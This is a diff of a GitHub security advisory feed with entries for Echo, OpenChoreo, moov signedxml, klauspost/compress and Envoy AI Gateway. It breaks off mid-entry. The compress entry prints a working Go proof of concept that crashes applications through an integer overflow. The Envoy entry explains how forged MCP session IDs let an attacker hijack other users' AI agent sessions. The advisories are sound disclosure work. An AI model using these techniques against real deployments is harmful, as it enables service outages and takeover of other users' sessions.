+<li><a href="https://github.com/advisories/GHSA-x9ff-22gv-65f4">https://github.com/advisories/GHSA-x9ff-22gv-65f4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x9ff-22gv-65f4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-23T20:49:11.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/labstack/echo/v4] Echo: BodyDump captures request and response bodies without size limits in v4]]></title>
+        <id>https://github.com/advisories/GHSA-f48p-c9v4-h7xv</id>
+        <link href="https://github.com/advisories/GHSA-f48p-c9v4-h7xv"/>
+        <updated>2026-10-23T20:48:45.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Echo v4's opt-in BodyDump middleware read complete request bodies into memory and retained complete response bodies without a capture limit. A client able to submit large requests to a route using BodyDump could cause large allocations before the application handler ran. Large responses, including responses whose size can be influenced by a client, also caused an additional unbounded capture allocation.</p>
+<p>Repeated or concurrent requests can exhaust process memory and cause denial of service. BodyDump is not enabled by default. Deployments with effective request limits may reduce the request-side exposure; response capture requires separate consideration.</p>
+<h2 id="affected-versions-and-patch">Affected versions and patch</h2>
+<p>Echo v4 versions through v4.16.0 are affected. Upgrade to <a href="https://github.com/labstack/echo/releases/tag/v4.16.1">v4.16.1</a>.</p>
+<p>The patch adds <code>BodyDumpConfig.MaxRequestBytes</code> and <code>MaxResponseBytes</code>, each defaulting to 5 MiB when zero. A value of <code>-1</code> explicitly restores unlimited capture. The complete request remains readable by the handler and the complete response is delivered to the client; only the callback's captured data is bounded. Request close behavior and read errors are preserved.</p>
+<p><a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">Fix commit</a>.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Disable BodyDump on exposed routes, particularly large uploads and downloads. Alternatively, enforce body-size limits before BodyDump and independently bound the responses that the application generates.</p>
+<h2 id="credits">Credits</h2>
+<p>Reported by @q490107865. The patch also incorporates request-body preservation work from @jakezwang in <a href="https://github.com/labstack/echo/pull/3105">#3105</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/labstack/echo/security/advisories/GHSA-f48p-c9v4-h7xv">https://github.com/labstack/echo/security/advisories/GHSA-f48p-c9v4-h7xv</a></li>
+<li><a href="https://github.com/labstack/echo/pull/3105">https://github.com/labstack/echo/pull/3105</a></li>
+<li><a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f</a></li>
+<li><a href="https://github.com/labstack/echo/releases/tag/v4.16.1">https://github.com/labstack/echo/releases/tag/v4.16.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-f48p-c9v4-h7xv">https://github.com/advisories/GHSA-f48p-c9v4-h7xv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f48p-c9v4-h7xv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-23T20:48:44.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: Missing consistency check between packageName and repoURL/repoHash in bazaar package install allows overwriting an existing, trusted plugin]]></title>
         <id>https://github.com/advisories/GHSA-rpx2-p6hp-x5gj</id>
@@ -686,1188 +1086,5 @@ ginServer.Handle("POST", "/api/storage/getLocalStorageVals", model.CheckAuth, ge
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-10-21T16:29:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/openchoreo/openchoreo] OpenChoreo: Authorization bypass on WorkflowRun update allows cross-project takeover of workflow runs]]></title>
-        <id>https://github.com/advisories/GHSA-46r4-q7wv-32fc</id>
-        <link href="https://github.com/advisories/GHSA-46r4-q7wv-32fc"/>
-        <updated>2026-10-21T16:29:55.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The OpenChoreo API server authorized <code>PUT .../workflowruns/{runName}</code> against ownership metadata taken from the request body, while the object it actually mutated was selected by the URL path. Nothing forced the two to agree.</p>
-<p>A <code>WorkflowRun</code>'s membership in a project and component is carried entirely by its <code>openchoreo.dev/project</code> and <code>openchoreo.dev/component</code> labels. Because the <code>workflowrun:update</code> check read those labels from the submitted object rather than the stored one, a caller holding <code>workflowrun:update</code> on one component could name a run belonging to a different project or component in the URL, supply labels for the component they legitimately control, pass the check, and have the unrelated run rewritten with their own ownership labels.</p>
-<p>The namespace is taken from the URL and feeds both the authorization check and the Kubernetes read, so it cannot diverge. This is cross-project and cross-component escalation inside a single namespace, not a cross-tenant issue.</p>
-<h2 id="impact">Impact</h2>
-<p>Rewriting the ownership labels transfers authority over the run. Every other WorkflowRun check (view, logs, events, status, delete, list) derives its scope from the stored labels, so once the write lands the policy engine legitimately grants the attacker access to an object they never had rights to. They can then:</p>
-<ul>
-<li>Read the victim's build logs. These stream raw pod logs from the workflow plane and routinely carry source paths, registry destinations, and credentials a build step echoed by accident.</li>
-<li>Read the run's Kubernetes events.</li>
-<li>Delete the run.</li>
-</ul>
-<p>So the primary impact is confidentiality and availability, not only integrity. On the integrity side, <code>spec.workflow.parameters</code> can be overwritten on a pending run, and manipulating the two ownership labels can either wedge the run in a permanent <code>ComponentValidationFailed</code> condition or downgrade it to a standalone run that skips component validation.</p>
-<p>Exploitation requires an authenticated caller with an <code>AuthzRoleBinding</code> or <code>ClusterAuthzRoleBinding</code> granting <code>workflowrun:update</code> at project or component scope in the victim's namespace, plus knowledge of the target run's name. An anonymous caller cannot reach this.</p>
-<h2 id="patches">Patches</h2>
-<p>The authorization check now loads the stored WorkflowRun and derives every ownership attribute from it instead of from the request body. Separately, the <code>openchoreo.dev/project</code> and <code>openchoreo.dev/component</code> labels are now immutable on update, so an authorized caller cannot hand their own run to another project either.</p>
-<table>
-<thead>
-<tr>
-<th>Line</th>
-<th>Affected</th>
-<th>Fixed in</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1.0.x</td>
-<td>1.0.0 through 1.0.5</td>
-<td>1.0.6</td>
-</tr>
-<tr>
-<td>1.1.x</td>
-<td>1.1.0 through 1.1.6</td>
-<td>1.1.7</td>
-</tr>
-<tr>
-<td>1.2.x</td>
-<td>1.2.0 through 1.2.4</td>
-<td>1.2.5</td>
-</tr>
-</tbody></table>
-<p>Upgrade to the patched release on your line. No configuration change is needed after upgrading.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>If you cannot upgrade immediately, restrict who holds <code>workflowrun:update</code>.</p>
-<p>Audit your <code>AuthzRole</code> and <code>ClusterAuthzRole</code> definitions for that action and remove it from any role granted to principals you would not trust with write access to every workflow run in the namespace. Among the roles shipped with OpenChoreo, only the system role <code>workload-publisher</code> lists <code>workflowrun:update</code> explicitly, and <code>admin</code> holds it through its <code>*</code> wildcard. Custom roles in your own values file may also include it, so check those.</p>
-<p>Treat any credential bound to <code>workload-publisher</code> as privileged. CI systems are the usual holder, and a leaked CI token is enough to run this.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openchoreo/openchoreo/security/advisories/GHSA-46r4-q7wv-32fc">https://github.com/openchoreo/openchoreo/security/advisories/GHSA-46r4-q7wv-32fc</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-113727">https://nvd.nist.gov/vuln/detail/CVE-2026-113727</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/pull/4596">https://github.com/openchoreo/openchoreo/pull/4596</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/pull/4618">https://github.com/openchoreo/openchoreo/pull/4618</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/pull/4626">https://github.com/openchoreo/openchoreo/pull/4626</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/pull/4627">https://github.com/openchoreo/openchoreo/pull/4627</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/commit/0e311468bb704b0dce7753b89c9d0204009285ca">https://github.com/openchoreo/openchoreo/commit/0e311468bb704b0dce7753b89c9d0204009285ca</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/commit/477031c6fece0666f144942fb02c0b579dacc0bb">https://github.com/openchoreo/openchoreo/commit/477031c6fece0666f144942fb02c0b579dacc0bb</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/commit/91e1e868eb8e0e67274109018d00a767b22eda14">https://github.com/openchoreo/openchoreo/commit/91e1e868eb8e0e67274109018d00a767b22eda14</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/commit/d5ed0ef62d9c9af7b05a72aed2bcbc0ac9d45426">https://github.com/openchoreo/openchoreo/commit/d5ed0ef62d9c9af7b05a72aed2bcbc0ac9d45426</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/releases/tag/v1.0.6">https://github.com/openchoreo/openchoreo/releases/tag/v1.0.6</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/releases/tag/v1.1.7">https://github.com/openchoreo/openchoreo/releases/tag/v1.1.7</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/releases/tag/v1.2.5">https://github.com/openchoreo/openchoreo/releases/tag/v1.2.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-46r4-q7wv-32fc">https://github.com/advisories/GHSA-46r4-q7wv-32fc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-46r4-q7wv-32fc</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-21T16:29:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/openchoreo/openchoreo] OpenChoreo: Authorization bypass on WorkflowRun update allows cross-project takeover of workflow runs]]></title>
-        <id>https://github.com/advisories/GHSA-46r4-q7wv-32fc</id>
-        <link href="https://github.com/advisories/GHSA-46r4-q7wv-32fc"/>
-        <updated>2026-10-21T16:29:55.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The OpenChoreo API server authorized <code>PUT .../workflowruns/{runName}</code> against ownership metadata taken from the request body, while the object it actually mutated was selected by the URL path. Nothing forced the two to agree.</p>
-<p>A <code>WorkflowRun</code>'s membership in a project and component is carried entirely by its <code>openchoreo.dev/project</code> and <code>openchoreo.dev/component</code> labels. Because the <code>workflowrun:update</code> check read those labels from the submitted object rather than the stored one, a caller holding <code>workflowrun:update</code> on one component could name a run belonging to a different project or component in the URL, supply labels for the component they legitimately control, pass the check, and have the unrelated run rewritten with their own ownership labels.</p>
-<p>The namespace is taken from the URL and feeds both the authorization check and the Kubernetes read, so it cannot diverge. This is cross-project and cross-component escalation inside a single namespace, not a cross-tenant issue.</p>
-<h2 id="impact">Impact</h2>
-<p>Rewriting the ownership labels transfers authority over the run. Every other WorkflowRun check (view, logs, events, status, delete, list) derives its scope from the stored labels, so once the write lands the policy engine legitimately grants the attacker access to an object they never had rights to. They can then:</p>
-<ul>
-<li>Read the victim's build logs. These stream raw pod logs from the workflow plane and routinely carry source paths, registry destinations, and credentials a build step echoed by accident.</li>
-<li>Read the run's Kubernetes events.</li>
-<li>Delete the run.</li>
-</ul>
-<p>So the primary impact is confidentiality and availability, not only integrity. On the integrity side, <code>spec.workflow.parameters</code> can be overwritten on a pending run, and manipulating the two ownership labels can either wedge the run in a permanent <code>ComponentValidationFailed</code> condition or downgrade it to a standalone run that skips component validation.</p>
-<p>Exploitation requires an authenticated caller with an <code>AuthzRoleBinding</code> or <code>ClusterAuthzRoleBinding</code> granting <code>workflowrun:update</code> at project or component scope in the victim's namespace, plus knowledge of the target run's name. An anonymous caller cannot reach this.</p>
-<h2 id="patches">Patches</h2>
-<p>The authorization check now loads the stored WorkflowRun and derives every ownership attribute from it instead of from the request body. Separately, the <code>openchoreo.dev/project</code> and <code>openchoreo.dev/component</code> labels are now immutable on update, so an authorized caller cannot hand their own run to another project either.</p>
-<table>
-<thead>
-<tr>
-<th>Line</th>
-<th>Affected</th>
-<th>Fixed in</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1.0.x</td>
-<td>1.0.0 through 1.0.5</td>
-<td>1.0.6</td>
-</tr>
-<tr>
-<td>1.1.x</td>
-<td>1.1.0 through 1.1.6</td>
-<td>1.1.7</td>
-</tr>
-<tr>
-<td>1.2.x</td>
-<td>1.2.0 through 1.2.4</td>
-<td>1.2.5</td>
-</tr>
-</tbody></table>
-<p>Upgrade to the patched release on your line. No configuration change is needed after upgrading.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>If you cannot upgrade immediately, restrict who holds <code>workflowrun:update</code>.</p>
-<p>Audit your <code>AuthzRole</code> and <code>ClusterAuthzRole</code> definitions for that action and remove it from any role granted to principals you would not trust with write access to every workflow run in the namespace. Among the roles shipped with OpenChoreo, only the system role <code>workload-publisher</code> lists <code>workflowrun:update</code> explicitly, and <code>admin</code> holds it through its <code>*</code> wildcard. Custom roles in your own values file may also include it, so check those.</p>
-<p>Treat any credential bound to <code>workload-publisher</code> as privileged. CI systems are the usual holder, and a leaked CI token is enough to run this.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openchoreo/openchoreo/security/advisories/GHSA-46r4-q7wv-32fc">https://github.com/openchoreo/openchoreo/security/advisories/GHSA-46r4-q7wv-32fc</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-113727">https://nvd.nist.gov/vuln/detail/CVE-2026-113727</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/pull/4596">https://github.com/openchoreo/openchoreo/pull/4596</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/pull/4618">https://github.com/openchoreo/openchoreo/pull/4618</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/pull/4626">https://github.com/openchoreo/openchoreo/pull/4626</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/pull/4627">https://github.com/openchoreo/openchoreo/pull/4627</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/commit/0e311468bb704b0dce7753b89c9d0204009285ca">https://github.com/openchoreo/openchoreo/commit/0e311468bb704b0dce7753b89c9d0204009285ca</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/commit/477031c6fece0666f144942fb02c0b579dacc0bb">https://github.com/openchoreo/openchoreo/commit/477031c6fece0666f144942fb02c0b579dacc0bb</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/commit/91e1e868eb8e0e67274109018d00a767b22eda14">https://github.com/openchoreo/openchoreo/commit/91e1e868eb8e0e67274109018d00a767b22eda14</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/commit/d5ed0ef62d9c9af7b05a72aed2bcbc0ac9d45426">https://github.com/openchoreo/openchoreo/commit/d5ed0ef62d9c9af7b05a72aed2bcbc0ac9d45426</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/releases/tag/v1.0.6">https://github.com/openchoreo/openchoreo/releases/tag/v1.0.6</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/releases/tag/v1.1.7">https://github.com/openchoreo/openchoreo/releases/tag/v1.1.7</a></li>
-<li><a href="https://github.com/openchoreo/openchoreo/releases/tag/v1.2.5">https://github.com/openchoreo/openchoreo/releases/tag/v1.2.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-46r4-q7wv-32fc">https://github.com/advisories/GHSA-46r4-q7wv-32fc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-46r4-q7wv-32fc</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-21T16:29:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/moov-io/signedxml] Moov signedxml: Unauthenticated denial of service in exclusive XML canonicalization]]></title>
-        <id>https://github.com/advisories/GHSA-5588-rp99-5fjh</id>
-        <link href="https://github.com/advisories/GHSA-5588-rp99-5fjh"/>
-        <updated>2026-10-21T16:27:58.000Z</updated>
-        <content type="html"><![CDATA[<p>Exclusive XML canonicalization (<code>http://www.w3.org/2001/10/xml-exc-c14n#</code>) in <code>github.com/moov-io/signedxml</code> copied the entire accumulated namespace map at every node during <code>ValidateReferences()</code>, before any reference digest or signature check.</p>
-<p>For a chain of nested elements that each declare many unused namespace prefixes, that produced <strong>O(m × depth²)</strong> time and peak memory (<code>m</code> = prefixes per level). <code>beevik/etree</code> caps tree depth (~1024), but <code>m</code> is unbounded, so a small attacker-controlled document (on the order of 1 MB) could drive multi-gigabyte allocations and OOM the process. No valid signature, matching certificate, or authentication is required.</p>
-<p>This is the library’s core path for SAML / WS-Federation service providers, which canonicalize attacker-supplied XML prior to authentication.</p>
-<h3 id="affected">Affected</h3>
-<ul>
-<li>Package: <code>github.com/moov-io/signedxml</code></li>
-<li>Function: <code>ExclusiveCanonicalization</code> (<code>exclusivecanonicalization.go</code>)</li>
-<li>Verified: <strong>v1.4.0</strong> and current default branch (commit <code>d79064a</code>). Earlier v1.2.x–v1.3.x releases are likely affected.</li>
-</ul>
-<h3 id="remediation">Remediation</h3>
-<p>Do not copy the whole namespace map per node. Maintain a single scope and push/pop only the prefixes introduced at each element. Replace linear prefix-in-scope scans with set lookups. Impose a defensive cap on in-scope namespace declarations and return an error rather than allocating unbounded memory.</p>
-<p>From @shuji-oh </p>
-<pre><code>Thanks for the fix — I re-ran my PoC against this branch and confirmed the memory blowup is gone.
-
-Before (main)
-
--- Doubling depth each time (m=10 fixed): allocated grows ~4x each time ≈ O(depth^2) --
-depth=250  m=10  payload=  0.07MB allocated=     45MB
-depth=500  m=10  payload=  0.14MB allocated=    179MB
-depth=1000 m=10  payload=  0.27MB allocated=    711MB
--- Increasing m (depth=1000 fixed): allocated scales roughly linearly with m --
-depth=1000 m=5   payload=  0.16MB allocated=    377MB
-depth=1000 m=100 payload=  2.57MB allocated=   6278MB
-After (fix/exc-c14n-namespace-dos)
-
--- Doubling depth each time (m=10 fixed): allocated grows ~4x each time ≈ O(depth^2) --
-depth=250  m=10  payload=  0.07MB allocated=      2MB
-depth=500  m=10  payload=  0.14MB allocated=      4MB
-depth=1000 m=10  payload=  0.27MB allocated=      7MB
--- Increasing m (depth=1000 fixed): allocated scales roughly linearly with m --
-depth=1000 m=5   payload=  0.16MB allocated=      4MB
-depth=1000 m=100 payload=  2.57MB allocated=     47MB
-That's roughly a 100–130x reduction in peak allocation for the same payload sizes, and no OOM in any of my runs. This looks like it resolves the issue — thanks for the quick fix!
-</code></pre>
-<h3 id="credit">Credit</h3>
-<p>Reported by Shuji Ohira (<a href="https://github.com/shuji-oh">@shuji-oh</a>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/moov-io/signedxml/security/advisories/GHSA-5588-rp99-5fjh">https://github.com/moov-io/signedxml/security/advisories/GHSA-5588-rp99-5fjh</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-113729">https://nvd.nist.gov/vuln/detail/CVE-2026-113729</a></li>
-<li><a href="https://github.com/moov-io/signedxml/commit/da2cd6126c4c53b7e59a367d287786e6f6a2d0d3">https://github.com/moov-io/signedxml/commit/da2cd6126c4c53b7e59a367d287786e6f6a2d0d3</a></li>
-<li><a href="https://github.com/moov-io/signedxml/releases/tag/v1.4.1">https://github.com/moov-io/signedxml/releases/tag/v1.4.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-5588-rp99-5fjh">https://github.com/advisories/GHSA-5588-rp99-5fjh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5588-rp99-5fjh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-21T16:27:55.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/klauspost/compress] Compress/s2: Integer Overflow or Wraparound and Out-of-bounds Write in compress]]></title>
-        <id>https://github.com/advisories/GHSA-259r-337f-4rfw</id>
-        <link href="https://github.com/advisories/GHSA-259r-337f-4rfw"/>
-        <updated>2026-10-20T14:33:35.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="signed-integer-overflow-in-s2newdict">Signed Integer Overflow in s2.NewDict</h1>
-<h2 id="summary">Summary</h2>
-<p>A signed integer overflow vulnerability in <code>s2.NewDict()</code> allows an attacker to bypass repeat index validation by supplying a dictionary with a uvarint-encoded repeat value exceeding <code>MaxInt64</code>. When <code>Dict.Encode()</code> is subsequently called, the overflowed negative repeat value causes an out-of-bounds memory access via <code>unsafe.Pointer</code> arithmetic, crashing the process with SIGSEGV.</p>
-<h2 id="package">Package</h2>
-<ul>
-<li><strong>Name:</strong> <code>github.com/klauspost/compress/s2</code></li>
-<li><strong>Ecosystem:</strong> Go</li>
-<li><strong>Affected versions:</strong> &lt;= v1.18.6 (all versions with <code>NewDict</code> function)</li>
-</ul>
-<h2 id="severity">Severity</h2>
-<p><strong>High (7.5)</strong> — CVSS v3.1: <code>AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></p>
-<h2 id="vulnerability">Vulnerability</h2>
-<h3 id="type">Type</h3>
-<ul>
-<li>CWE-190: Integer Overflow or Wraparound</li>
-<li>CWE-787: Out-of-bounds Write (via unsafe.Pointer)</li>
-</ul>
-<h3 id="description">Description</h3>
-<p>The <code>NewDict()</code> function reads a uvarint from dictionary data and converts it to <code>int</code>:</p>
-<pre><code class="language-go">r, n := binary.Uvarint(dict)
-// ...
-d.repeat = int(r)
-if d.repeat &gt; len(dict) {
-    return nil
-}
-</code></pre>
-<p>When <code>r</code> exceeds <code>MaxInt64</code> (9223372036854775807), <code>int(r)</code> overflows to a negative value. Since a negative number is never greater than a positive length, the validation check is bypassed.</p>
-<p>When <code>Dict.Encode()</code> is called, the negative <code>repeat</code> value causes an integer overflow in <code>encodeBlockDictGo()</code>:</p>
-<pre><code class="language-go">repeat := len(dict.dict) - dict.repeat  // overflows: 62 - (-5758978476775341977) = huge positive
-candidate := len(dict.dict) - repeat + s // underflows to negative
-load32(dict.dict, candidate)             // OOB via unsafe.Pointer
-</code></pre>
-<p><code>load32</code> calls <code>le.Load32</code> which uses <code>unsafe.Pointer</code> arithmetic without bounds checking:</p>
-<pre><code class="language-go">func Load32[I Indexer](b []byte, i I) uint32 {
-    return *(*uint32)(unsafe.Add(unsafe.Pointer(unsafe.SliceData(b)), i))
-}
-</code></pre>
-<p>This causes a segmentation fault (SIGSEGV) when the negative index is dereferenced.</p>
-<h2 id="poc">PoC</h2>
-<pre><code class="language-go">package main
-
-import (
-    "encoding/binary"
-    "fmt"
-    "github.com/klauspost/compress/s2"
-)
-
-func main() {
-    var dictData []byte
-    buf := make([]byte, binary.MaxVarintLen64)
-    n := binary.PutUvarint(buf, 12687765596934209639) // &gt; MaxInt64
-    dictData = append(dictData, buf[:n]...)
-    dictData = append(dictData, make([]byte, 16)...) // minimum dict size
-
-    dict := s2.NewDict(dictData)
-    // dict is non-nil despite invalid repeat value (overflow bypassed validation)
-
-    src := make([]byte, 64)
-    for i := range src { src[i] = byte(i) }
-    dict.Encode(nil, src) // SIGSEGV: OOB access via unsafe.Pointer
-}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Denial of Service:</strong> The process crashes immediately with SIGSEGV</li>
-</ul>
-<h2 id="attack-vector">Attack Vector</h2>
-<p>Any application that:</p>
-<ol>
-<li>Accepts user-supplied S2 dictionary data via <code>s2.NewDict()</code></li>
-<li>Calls <code>Dict.Encode()</code> on any data ≥32 bytes</li>
-</ol>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Validate the uvarint value before converting to int:</p>
-<pre><code class="language-go">if r &gt; math.MaxInt64 {
-    return nil
-}
-d.repeat = int(r)
-</code></pre>
-<p>Or use <code>uint</code> for the repeat field and validate against <code>uint(len(dict))</code>.</p>
-<h2 id="references">References</h2>
-<ul>
-<li>Source: <code>s2/dict.go</code> lines 59-61 (vulnerability), <code>s2/encode_all.go</code> line 947 (crash site)</li>
-<li>Commit: 539243b (v1.18.6 + 4 commits)</li>
-</ul>
-<h2 id="credits">Credits</h2>
-<p>Christopher Linke / <a href="https://github.com/celinke97/">https://github.com/celinke97/</a></p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/klauspost/compress/security/advisories/GHSA-259r-337f-4rfw">https://github.com/klauspost/compress/security/advisories/GHSA-259r-337f-4rfw</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63209">https://nvd.nist.gov/vuln/detail/CVE-2026-63209</a></li>
-<li><a href="https://github.com/klauspost/compress/pull/1163">https://github.com/klauspost/compress/pull/1163</a></li>
-<li><a href="https://github.com/klauspost/compress/commit/539243b8823ee8f03e49969823d57c348c917536">https://github.com/klauspost/compress/commit/539243b8823ee8f03e49969823d57c348c917536</a></li>
-<li><a href="https://github.com/klauspost/compress/commit/8668e357e776d5152ed62f33c17f21b8690664fa">https://github.com/klauspost/compress/commit/8668e357e776d5152ed62f33c17f21b8690664fa</a></li>
-<li><a href="https://github.com/klauspost/compress/releases/tag/v1.18.7">https://github.com/klauspost/compress/releases/tag/v1.18.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-259r-337f-4rfw">https://github.com/advisories/GHSA-259r-337f-4rfw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-259r-337f-4rfw</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-20T14:33:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/envoyproxy/ai-gateway] agent-router: MCP session resume does not verify the embedded anti-hijacking subject; default Helm seed makes session IDs forgeable]]></title>
-        <id>https://github.com/advisories/GHSA-953h-535j-jg2v</id>
-        <link href="https://github.com/advisories/GHSA-953h-535j-jg2v"/>
-        <updated>2026-10-19T16:53:27.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The MCP proxy's client-facing session ID embeds the authenticated caller's
-subject (JWT <code>sub</code> claim) specifically as an anti-hijacking discriminator —
-matching the Model Context Protocol specification's documented session-hijacking
-guidance (<a href="https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices#session-hijacking">https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices#session-hijacking</a>).
-However, the session-resume path never checks that discriminator against the
-current caller's identity, so any client that obtains a session ID (its own or
-another user's) can resume that session and act with it — including on
-routes with per-user backend sessions. This is aggravated by the official
-Helm chart shipping a literal, publicly known default seed
-(<code>"default-insecure-seed"</code>) for the key that encrypts these session IDs.</p>
-<h2 id="impact">Impact</h2>
-<p>An attacker who obtains (or, under the default seed, forges) another user's
-<code>Mcp-Session-Id</code> value can resume that user's MCP session against the backend
-MCP server(s) bound to the route — reading conversation/tool-call state and
-invoking further JSON-RPC methods (e.g. <code>tools/call</code>, <code>resources/read</code>) in the
-context of that other user's already-initialized backend session. On a
-multi-tenant AI Gateway deployment, this crosses the exact trust boundary the
-subject-embedding was added to protect.</p>
-<h2>Location</h2>
-<ul>
-<li><code>internal/mcpproxy/session.go</code> — <code>clientToGatewaySessionID.backendSessionIDs()</code>
-(around line 707-765): parses <code>{routeName}@{subject}@{backends}</code> and returns
-only <code>(perBackendSessionIDs, route, error)</code>. The comment at the subject-parsing
-site reads: "The subject ... is retained inside the encrypted session ID for
-anti-hijacking purposes but is not needed during parsing." — the subject is
-discarded, never returned, never compared.</li>
-<li><code>internal/mcpproxy/mcpproxy.go</code> — <code>sessionFromID(id, lastEvent)</code> (around line
-282-323): resumes a session purely from the decrypted blob; it is never passed
-the current request's authenticated subject, so there is nothing to compare
-against even if <code>backendSessionIDs()</code> did return it.</li>
-<li><code>internal/mcpproxy/legacy.go</code> — <code>extractSubject(r)</code> (around line 1549-1562) is
-called exactly once, only at session creation (<code>handleInitializeRequest</code> -&gt;
-<code>newSession</code>, line ~307/484/491) to embed the subject when the session ID is
-minted. All three session-resume call sites (<code>serveGET</code>/<code>servePOST</code>/<code>serverDELETE</code>
-paths, lines ~133, 167, 216) call <code>sessionFromID</code> with no subject argument at all.</li>
-<li><code>internal/mcpproxy/mcpproxy.go</code> line 259 (<code>clientToGatewaySessionIDFromEntries</code>)
-is where the subject is embedded at creation, confirming the intended design.</li>
-<li>Aggravating factor: <code>manifests/charts/ai-gateway-helm/values.yaml</code> line 297
-ships <code>seed: "default-insecure-seed"</code> as the out-of-the-box value for
-<code>controller.mcp.sessionEncryption.seed</code>, which <code>templates/deployment.yaml</code>
-passes straight to <code>--mcpSessionEncryptionSeed</code> (also literally defaulted to
-<code>"default-insecure-seed"</code> in <code>cmd/controller/main.go</code> and
-<code>cmd/extproc/mainlib/main.go</code> when the flag is omitted entirely). Session IDs
-are <code>salt || nonce || ciphertext</code> (see <code>internal/mcpproxy/crypto.go</code>), so
-knowing the seed and the (also-defaulted) PBKDF2 iteration count is sufficient
-to derive the AES-GCM key and both decrypt observed session IDs and encrypt
-new ones for an arbitrary chosen subject/backend-session combination.</li>
-</ul>
-<h2 id="reproduction-code-level-not-run-against-a-live-cluster">Reproduction (code-level, not run against a live cluster)</h2>
-<ol>
-<li>Deploy Envoy AI Gateway with an <code>MCPRoute</code> that has an OAuth/JWT
-<code>SecurityPolicy</code> attached (so <code>internalapi.MCPSubjectHeader</code> is populated)
